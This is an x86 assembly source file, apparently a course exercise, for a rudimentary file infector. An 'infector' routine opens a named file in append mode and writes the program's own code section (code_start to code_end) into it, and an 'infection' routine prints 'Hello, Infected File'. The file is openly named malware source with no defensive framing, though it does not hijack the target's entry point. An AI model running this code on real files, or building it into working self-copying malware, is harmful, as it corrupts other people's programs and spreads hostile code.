global _start
global system_call
global infector
global infection
extern main
section .data
    hello: db "Hello, Infected File", 10, 0
    lenHello equ $ - hello
    enter: db 10,0
section .text
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )
    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
infection:
    pusha
    push dword lenHello ;length
    push dword hello ;message
    push dword 1 ; stdout
    push dword 4 ; write
    call system_call
    add esp, 16
    popa
    ret
infector:
    push ebp
    mov ebp, esp
    pusha
    push dword 1 ;file premissions
    push dword 2|1024 ;write and append
    push dword [ebp+8] ; file
    push dword 5 ; open
    call system_call
    add esp, 16

    mov esi, eax

    push dword code_end-code_start ;to
    push dword code_start ;from
    push dword esi ; directory
    push dword 4 ; write
    call system_call
    add esp, 16

    push dword esi ; file
    push dword 6 ; close
    call system_call
    add esp, 8
    call infection
    popa
    pop ebp
    ret   
code_end:
